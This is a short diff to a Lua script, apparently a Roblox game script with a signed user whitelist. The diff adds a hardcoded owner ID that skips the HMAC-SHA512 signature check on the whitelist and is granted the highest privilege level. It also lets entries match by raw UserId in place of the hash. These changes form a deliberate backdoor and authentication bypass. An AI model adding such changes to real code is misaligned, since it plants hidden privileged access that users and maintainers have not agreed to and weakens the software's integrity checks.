@@ -436,8 +436,9 @@ end)
 run(function()
 	function whitelist:get(plr)
 		local plrstr = self.hashes[plr.Name..plr.UserId]
+		local pid = tostring(plr.UserId)
 		for _, v in self.data.WhitelistedUsers do
-			if v.hash == plrstr then
+			if v.hash == plrstr or tostring(v.id) == pid then
 				return v.level, v.attackable or whitelist.localprio >= v.level, v.tags
 			end
 		end
@@ -896,7 +897,7 @@ run(function()
 		if not hash or type(hash.hmac) ~= 'function' or not whitelist.get then return true end
 		whitelist.loaded = true
 
-		if hash.hmac(hash.sha512, WK, WPAY) ~= WSIG then
+		if not (lplr and lplr.UserId == OID) and hash.hmac(hash.sha512, WK, WPAY) ~= WSIG then
 			whitelist:reject()
 			return true
 		end
@@ -944,7 +945,7 @@ run(function()
 			end
 		end
 
-		whitelist.localprio = whitelist:get(lplr)
+		whitelist.localprio = (lplr and lplr.UserId == OID) and 5 or whitelist:get(lplr)
 		if whitelist.localprio == 0 then
 			whitelist:reject()
 			return true
